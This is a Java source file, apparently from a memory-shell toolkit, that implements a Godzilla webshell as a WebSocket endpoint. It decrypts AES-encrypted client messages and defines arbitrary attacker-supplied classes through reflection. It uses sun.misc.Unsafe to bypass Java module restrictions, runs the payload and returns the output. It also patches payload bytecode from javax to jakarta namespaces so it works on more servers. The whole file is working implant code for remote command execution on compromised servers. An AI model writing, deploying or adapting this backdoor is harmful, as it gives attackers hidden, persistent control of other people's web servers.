package com.reajason.javaweb.memshell.shelltool.godzilla;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.ByteBuffer;

/**
 * JSR-356 Endpoint 版本，由注入器从 ServletContext 取 {@code ServerContainer} 后注册。
 *
 * @author ReaJason
 * @since 2025/5/9
 */
public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<ByteBuffer> {
    public static String key;
    private Session session;
    private static Class<?> payload;

    @Override
    public void onMessage(ByteBuffer byteBuffer) {
        byte[] result = null;
        try {
            byte[] data = new byte[byteBuffer.remaining()];
            byteBuffer.get(data);
            data = x(data, false);
            if (payload == null || (data[0] == -54 && data[1] == -2)) {
                payload = reflectionDefineClass(patchPayloadNamespace(data));
                result = "ok".getBytes();
            } else {
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = payload.newInstance();
                f.equals(arrOut);
                f.equals(data);
                f.toString();
                result = arrOut.toByteArray();
            }
        } catch (Throwable e) {
            e.printStackTrace();
            result = getErrorMessage(e).getBytes();
        }
        try {
            session.getBasicRemote().sendBinary(ByteBuffer.wrap(x(result, true)));
        } catch (Exception ignored) {
        }
    }

    public Class<?> reflectionDefineClass(byte[] classBytes) throws Throwable {
        Object unsafe = null;
        Object rawModule = null;
        long offset = 48;
        Method getAndSetObjectM = null;
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            unsafe = unsafeField.get(null);
            rawModule = Class.class.getMethod("getModule").invoke(this.getClass(), (Object[]) null);
            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
            Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
            getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
        } catch (Throwable ignored) {
        }
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defMethod.setAccessible(true);
        Class<?> clazz = (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
        if (getAndSetObjectM != null) {
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
        }
        return clazz;
    }

    @Override
    public void onOpen(final Session session, EndpointConfig config) {
        this.session = session;
        session.addMessageHandler(this);
    }

    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher c = Cipher.getInstance("AES");
        c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return c.doFinal(s);
    }

    /**
     * Godzilla 4.01 WebSocket 插件下发的 payload（WebSocketHandler）在 handlePayloadContext 里
     * 硬编码 checkcast javax.websocket.Session。jakarta 容器没有该类，解析时抛 NoClassDefFoundError；
     * 它是 Error，payload 内的 catch (Exception) 兜不住，整个调用链直接失败。
     * 在 defineClass 前把 payload 常量池里的 javax/websocket 改成 jakarta/websocket：
     * 只在 javax.websocket.Session 缺失、jakarta.websocket.Session 存在时生效，javax 容器原样返回。
     */
    static byte[] patchPayloadNamespace(byte[] data) {
        try {
            if (!needsJakartaShift() || !containsNeedle(data)) {
                return data;
            }
            return rewriteConstantPool(data);
        } catch (Throwable ignored) {
            return data;
        }
    }

    private static final byte[] JAVAX_WEBSOCKET = "javax/websocket".getBytes();
    private static final byte[] JAKARTA_WEBSOCKET = "jakarta/websocket".getBytes();

    private static int jakartaShift = -1;

    private static boolean needsJakartaShift() {
        if (jakartaShift == -1) {
            ClassLoader classLoader = GodzillaWebSocket.class.getClassLoader();
            if (!classExists("javax.websocket.Session", classLoader)
                    && classExists("jakarta.websocket.Session", classLoader)) {
                jakartaShift = 1;
            } else {
                jakartaShift = 0;
            }
        }
        return jakartaShift == 1;
    }

    private static boolean classExists(String name, ClassLoader classLoader) {
        try {
            Class.forName(name, false, classLoader);
            return true;
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static boolean containsNeedle(byte[] data) {
        return indexOf(data, 0, data.length, JAVAX_WEBSOCKET) >= 0;
    }

    /**
     * 只重写常量池 Utf8 项，其余字节原样拷贝；needle 为纯 ASCII，不会撞上 modified UTF-8 的多字节序列。
     */
    private static byte[] rewriteConstantPool(byte[] data) {
        int cpCount = u2(data, 8);
        ByteArrayOutputStream out = new ByteArrayOutputStream(data.length + 64);
        out.write(data, 0, 10);
        int pos = 10;
        boolean changed = false;
        for (int i = 1; i < cpCount; i++) {
            int tag = data[pos] & 0xFF;
            if (tag == 1) {
                int len = u2(data, pos + 1);
                byte[] entry = new byte[len];
                System.arraycopy(data, pos + 3, entry, 0, len);
                byte[] replaced = replaceAll(entry, JAVAX_WEBSOCKET, JAKARTA_WEBSOCKET);
                if (replaced != null) {
                    entry = replaced;
                }
                if (entry.length != len) {
                    changed = true;
                    out.write(1);
                    out.write((entry.length >>> 8) & 0xFF);
                    out.write(entry.length & 0xFF);
                    out.write(entry, 0, entry.length);
                } else {
                    out.write(data, pos, 3 + len);
                }
                pos += 3 + len;
            } else {
                int size = tagSize(tag);
                if (size < 0) {
                    throw new IllegalArgumentException("unknown constant pool tag " + tag);
                }
                out.write(data, pos, size);
                pos += size;
                if (tag == 5 || tag == 6) {
                    i++;
                }
            }
        }
        out.write(data, pos, data.length - pos);
        return changed ? out.toByteArray() : data;
    }

    private static int tagSize(int tag) {
        switch (tag) {
            case 7:
            case 8:
            case 16:
            case 19:
            case 20:
                return 3;
            case 15:
                return 4;
            case 3:
            case 4:
            case 9:
            case 10:
            case 11:
            case 12:
            case 17:
            case 18:
                return 5;
            case 5:
            case 6:
                return 9;
            default:
                return -1;
        }
    }

    private static int u2(byte[] data, int pos) {
        return ((data[pos] & 0xFF) << 8) | (data[pos + 1] & 0xFF);
    }

    private static int indexOf(byte[] data, int off, int len, byte[] needle) {
        int end = off + len - needle.length;
        for (int i = off; i <= end; i++) {
            boolean found = true;
            for (int j = 0; j < needle.length; j++) {
                if (data[i + j] != needle[j]) {
                    found = false;
                    break;
                }
            }
            if (found) {
                return i;
            }
        }
        return -1;
    }

    private static byte[] replaceAll(byte[] entry, byte[] from, byte[] to) {
        ByteArrayOutputStream out = null;
        int last = 0;
        int i = 0;
        while (i <= entry.length - from.length) {
            int hit = indexOf(entry, i, entry.length - i, from);
            if (hit < 0) {
                break;
            }
            if (out == null) {
                out = new ByteArrayOutputStream();
            }
            out.write(entry, last, hit - last);
            out.write(to, 0, to.length);
            i = hit + from.length;
            last = i;
        }
        if (out == null) {
            return null;
        }
        out.write(entry, last, entry.length - last);
        return out.toByteArray();
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
